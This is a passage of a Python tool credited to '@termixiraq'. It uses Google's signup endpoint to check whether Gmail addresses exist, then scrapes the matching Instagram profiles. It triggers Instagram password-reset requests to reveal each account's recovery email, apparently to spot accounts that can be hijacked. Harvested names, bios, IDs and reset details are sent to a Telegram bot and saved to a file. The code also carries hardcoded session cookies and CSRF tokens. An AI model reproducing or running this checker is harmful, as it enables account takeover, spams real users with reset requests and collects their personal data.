                'cookie':f'OGP=-19019112:; OGPC=19019112-2:; AEC=Ackid1S23dF7bQM-_0OCQUIMAxlJT6UQ7kJ67WfjoZ4GR9QaUf7nVUGeS98; NID=511=Teo8xCZ02OFPC6FlYoX2um01GIrlb9UR6NBlG6aZT8_y7C5LKgyCDGnoyjWE1qCa6NDN4zolWTDuGmj_6xSFi4SY3sZ5sgL3NVVKdRvkQKaQQw6WF8KRVX-tB9FNWgPqI481IQ4td0TNIF4WBsgd1G-X_WwJLirnjZOMXMBwNiqHl8LzQrQRcQ; 1P_JAR=2023-09-23-19; __Host-GAPS=1:AI0Jr4suRW2V3Z9AJ_EHrOfuj8g1ow:j6tbQfvXA0_99rgx',
                'google-accounts-xsrf':'1',
                'origin':'https://accounts.google.com',
                'referer':'https://accounts.google.com/signup/v2/createusername?cc=IQ&dsh=S1929428821%3A1695499162771291&flowEntry=SignUp&flowName=GlifWebSignIn&hl=cy&ifkv=AYZoVhenrpZ4woEGqcGC8b6wc0PTEMJO_NmcsMrtUsh7wxI_uhZTz5NeS4keAc-QbkZv0DohSw4lmw&theme=glif&TL=AJeL0C76qwBDDsftUiC9xtxwA5EvN8ZC3FCHKjox9S3I2XkubvAQfYlgYI0jpKvL',
                'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 UBrowser/6.0.1308.1016 Safari/537.36',
                'x-chrome-uma-enabled':'1',
                'x-same-domain':'1'
                }

                uui = uuid.uuid4()
                data = {
                'theme': 'glif',
                'continue': 'https://accounts.google.com/ManageAccount?nc=1',
                'f.req': f'["TL:{TLL2}","{email}",0,0,0,null,0,15856]',
                'at': 'AFoagUV7ayPwNwcTzAJd8hG5bsUQ9UspxA:1695553167761',
                'azt': 'AFoagUXaPxbm3Wne7jhJpuTr_KRQXXYYHQ:1695553167761',
                'cookiesDisabled': 'false',
                'deviceinfo': f'[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[5,"77185425430.apps.googleusercontent.com",["https://www.google.com/accounts/OAuthLogin"],null,null,"{uui}",null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,5,null,null,[],null,null,null,null,[]],null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn',
                'checkConnection': '',
                'checkedDomains': 'youtube',
                'pstMsg': '1'
                }

                response = requests.post(link,headers=headers,data=data).text

                if ('"gf.uar",3,')in response:
                    print(f'{X}Not Found {Y}Email : {X}{email}')
                elif ('"gf.uar",2')in response:
                    print(f'{Z}Error Account {Y}Email : {Z}{email}')
                elif ('"gf.uar",1') in response:
                    print(f'{F}Hit Account {Y}Eamil : {F}{email}')
                    username = email.split('@gmail.com')[0]
                    headers={
            'Accept':'*/*',
            'Accept-Encoding':'gzip, deflate, br',
            'Accept-Language':'ar,en-US;q=0.9,en;q=0.8',
            'Cookie':'csrftoken=IchbyeD2EMfxlXtEidhVb473sX2nACJi; mid=ZMexfQALAAGt5vpo-vofNvm6berX; ig_did=60ACBB13-D599-407C-82A8-89F0ACCD5C26; ig_nrcb=1; datr=x83MZBLzuED-nRpgcIfvN5cA',
            'Referer':'https://www.instagram.com/gzik/',
            'Sec-Ch-Prefers-Color-Scheme':'light',
            'Sec-Ch-Ua':'"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'Sec-Ch-Ua-Full-Version-List':'"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.170", "Chromium";v="115.0.5790.170"',
            'Sec-Ch-Ua-Mobile':'?0',
            'Sec-Ch-Ua-Platform':'"Windows"',
            'Sec-Ch-Ua-Platform-Version':'"10.0.0"',
            'Sec-Fetch-Dest':'empty',
            'Sec-Fetch-Mode':'cors',
            'Sec-Fetch-Site':'same-origin',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Viewport-Width':'454',
            'X-Asbd-Id':'129477',
            'X-Csrftoken':'IchbyeD2EMfxlXtEidhVb473sX2nACJi',
            'X-Ig-App-Id':'936619743392459',
            'X-Ig-Www-Claim':'0',
            'X-Requested-With':'XMLHttpRequest',
            }
                    data={
            'username': username,
            }
                    try:
                        req = requests.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={username}',headers=headers,data=data).json()
                        fullname=req['data']['user']['full_name']
                        followers=req['data']['user']['edge_followed_by']['count']
                        following=req['data']['user']['edge_follow']['count']
                        bio=req['data']['user']['biography']
                        post=req['data']['user']['edge_owner_to_timeline_media']['count']
                        id=req['data']['user']['id']
                        zp=requests.get(f'https://o7aa.pythonanywhere.com/?id={id}').json()
                        date=zp['date']
                        head= {
                        "accept": "*/*",
                        "accept-language": "ar-AE,ar-IQ;q=0.9,ar;q=0.8,en-US;q=0.7,en;q=0.6",
                        "sec-ch-prefers-color-scheme": "light",
                        "sec-ch-ua": "\"Not:A-Brand\";v=\"99\", \"Chromium\";v=\"112\"",
                        "sec-ch-ua-full-version-list": "\"Not:A-Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"112.0.5615.137\"",
                        "sec-ch-ua-mobile": "?1",
                        "sec-ch-ua-platform": "\"Android\"",
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "viewport-width": "412",
                        "x-asbd-id": "198387",
                        "x-csrftoken": "nVW5MosXQoEr1Rv1Nc4qraggjTdU5pss",
                        "x-ig-app-id": "1217981644879628",
                        "x-ig-www-claim": "hmac.AR2QM86Qe5fITwAGguadrM-4LVWQ1OQc5RTpaUp_PHZQAkfb",
                        "x-requested-with": "XMLHttpRequest"
                        }
                        data = {
                        'ig_sig_key_version': '4',
                        "user_id":f'{id}'
                        }
                        hr = requests.post('https://i.instagram.com/api/v1/accounts/send_password_reset/',headers=head, data=data).json()
                        o=hr['obfuscated_email']
                        ko=o.split('@')[0]
                        first = email[0]
                        last=email[email.index('@') -1]
                        lo=f"""
- Hit Account Instagram 
-----------------------------
- Error Info - 
- Email - {email}
- UseRnaMe - {username} 
- NamE - {fullname} 
- Bio - {bio} 
- FolLoeRs - {followers} 
- FolLoWiNg - {following} 
- Post - {post}
- Id - {id}
- DaTe - {date}
- ReSeT - {o}
-----------------------------
- Programmer - @termixiraq
"""
                        llo=f"""
- Hit Account Instagram 
-----------------------------
- Good Info - 
- Email - {email}
- UseRnaMe - {username} 
- NamE - {fullname} 
- Bio - {bio} 
- FolLoeRs - {followers} 
- FolLoWiNg - {following} 
- Post - {post}
- Id - {id}
- DaTe - {date}
- ReSeT - {o}
-----------------------------
- Programmer - @termixiraq
"""
                        if first and last in ko:
                            print(llo)
                            requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={llo}''')
                            with open("Done_INSTAGRAM_V3.txt","a")as pr:
                                pr.write(llo+'\n')
                        else:
                            print(lo)
                            requests.post(f'''https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={lo}''')
                            with open("Done_INSTAGRAM_V3.txt","a")as pr:
                                pr.write(lo+'\n')
                    except:
                        pass
            else:
                print(f'{Z}Error Account {Y}InstaGram : {Z}{email}')

    except requests.exceptions.Timeout:
        inst()

                
def rm():
     try:
        os.remove("INSTAGRAMV3.txt")
        print('\n')
        print(F+' Done Delete List ')
        print('\n')
        
     except:
        print('\n')
        print(Z1+' Error File Found ')
        print('\n')
def home():
     po=f"""{F}
</1> Get List Random
</2> Check List
</3> Remove List
"""
     print(po)
     try:
          vc=int(input(O+' Give me Number - '+X))
          os.system('clear')
     except:
          print(Z1+' Error Input ')
          exit()
     if vc==1:
        prox_list = []
        for i in range(5):
            t = threading.Thread(target=h)
            t.start()
            prox_list.append(t)
            time.sleep(0.00)
        h()
     elif vc==2:
         inst()
     elif vc==3:
         rm()
home()
